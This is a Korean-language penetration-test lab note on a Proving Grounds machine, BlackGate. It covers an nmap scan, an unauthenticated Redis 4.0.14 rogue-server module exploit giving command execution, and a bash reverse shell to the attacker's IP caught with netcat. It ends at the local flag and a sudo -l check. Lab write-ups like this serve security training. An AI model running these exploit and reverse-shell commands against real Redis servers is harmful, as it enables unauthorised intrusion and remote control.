---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/unsolved
type: machine
platform: pg
os: linux
ip: 192.168.141.176
ports: [22, 6379]
services: [redis, ssh]
status: unsolved
tech_count: 0
---
### Nmap
```bash
┌──(kali㉿kali)-[~/PG/BlackGate]
└─$ nnmap 192.168.141.176
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-28 13:44 +0900
Nmap scan report for 192.168.141.176
Host is up (0.086s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
6379/tcp open  redis   Redis key-value store 4.0.14
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   86.23 ms 192.168.45.1
2   86.18 ms 192.168.45.254
3   86.28 ms 192.168.251.1
4   86.36 ms 192.168.141.176

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
```


6379/tcp open  redis   Redis key-value store 4.0.14 exploit 검색
https://github.com/vulhub/redis-rogue-getshell

```bash
┌──(kali㉿kali)-[~/PG/BlackGate/redis-rogue-getshell]
└─$ python redis-master.py -r 192.168.141.176 -p 6379 -L 192.168.45.223 -P 4444 -f RedisModulesSDK/exp.so -c "id"
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$14\r\n192.168.45.223\r\n$4\r\n4444\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
>> receive data: b'+OK\r\n'
>> receive data: b'PING\r\n'
>> receive data: b'REPLCONF listening-port 6379\r\n'
>> receive data: b'REPLCONF capa eof capa psync2\r\n'
>> receive data: b'PSYNC 9e425474497a66eb92853781cf9f9d5aa8978d9e 1\r\n'
>> send data: b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*2\r\n$11\r\nsystem.exec\r\n$2\r\nid\r\n'
>> receive data: b'$60\r\nuid=1001(prudence) gid=1001(prudence) groups=1001(prudence)\n\r\n'
uid=1001(prudence) gid=1001(prudence) groups=1001(prudence)

>> send data: b'*3\r\n$6\r\nMODULE\r\n$6\r\nUNLOAD\r\n$6\r\nsystem\r\n'
>> receive data: b'+OK\r\n'
```

[[파일보관/d328a8b036f408dd082ce86ea9a0df35_MD5.jpg|Open: Pasted image 20260831104607.png]]
![[파일보관/d328a8b036f408dd082ce86ea9a0df35_MD5.jpg]]

리버스쉘 실행
```bash
┌──(kali㉿kali)-[~/PG/BlackGate/redis-rogue-getshell]
└─$ python redis-master.py -r 192.168.141.176 -p 6379 -L 192.168.45.223 -P 8888 -f RedisModulesSDK/exp.so -c "bash -c 'bash -i >& /dev/tcp/192.168.45.223/4444 0>&1'"
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$14\r\n192.168.45.223\r\n$4\r\n8888\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
>> receive data: b'+OK\r\n'
>> receive data: b'PING\r\n'
>> receive data: b'REPLCONF listening-port 6379\r\n'
>> receive data: b'REPLCONF capa eof capa psync2\r\n'
>> receive data: b'PSYNC c25151b12aedce1e116d683d1626109a013bea2b 1\r\n'
>> send data: b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'
>> receive data: b'+OK\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n'
>> receive data: b'+OK\r\n'
>> send data: b"*2\r\n$11\r\nsystem.exec\r\n$54\r\nbash -c 'bash -i >& /dev/tcp/192.168.45.223/4444 0>&1'\r\n"
```

리버스쉘 획득 후 flag 획득
```bash
┌──(kali㉿kali)-[~/PG/BlackGate]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.223] from (UNKNOWN) [192.168.141.176] 53428
bash: cannot set terminal process group (875): Inappropriate ioctl for device
bash: no job control in this shell
prudence@blackgate:/tmp$ whoami
whoami
prudence
prudence@blackgate:/tmp$ ls
ls
exp.so
netplan_wryhz7j_
netplan_xlqiteug
snap.lxd
systemd-private-ea0cd2a28a8549b89bf0cd4e1fd218a3-systemd-logind.service-QMmiQg
systemd-private-ea0cd2a28a8549b89bf0cd4e1fd218a3-systemd-resolved.service-wOhzMg
systemd-private-ea0cd2a28a8549b89bf0cd4e1fd218a3-systemd-timesyncd.service-DasY2f
vmware-root_708-2998936538
prudence@blackgate:/tmp$ cd
cd
prudence@blackgate:~$ ls
ls
local.txt
notes.txt
prudence@blackgate:~$ cat local.txt
cat local.txt
c68b27d911143e2a9d167fc47cc3a56d
```

sudo -l 확인
```bash
prudence@blackgate:~$ sudo -l
sudo -l
Matching Defaults entries for prudence on blackgate:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prudence may run the following commands on blackgate:
    (root) NOPASSWD: /usr/local/bin/redis-status
```

